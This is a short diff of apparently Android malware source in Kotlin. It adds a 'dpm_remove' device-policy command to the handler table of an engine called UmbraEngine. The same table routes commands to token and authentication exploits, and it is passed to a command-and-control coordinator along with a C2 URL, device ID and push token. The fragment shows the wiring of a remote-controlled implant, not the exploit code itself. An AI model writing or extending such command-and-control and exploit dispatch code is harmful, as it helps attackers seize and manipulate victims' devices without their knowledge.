@@ -144,7 +144,8 @@ object UmbraEngine {
             }},
             "pat"      to { cmd -> PatTokenExploit.exploit(context, cmd) },
             "authfw"   to { cmd -> AuthFwExploit.exploit(context, cmd) },
-            "dpm_grant" to { cmd -> DpmPermissionGrant.grant(context, cmd) }
+            "dpm_grant" to { cmd -> DpmPermissionGrant.grant(context, cmd) },
+            "dpm_remove" to { cmd -> DpmPermissionGrant.remove(context, cmd) },
         )
 
         C2Coordinator.start(context, deviceId, c2Url, fcmToken, handlers)
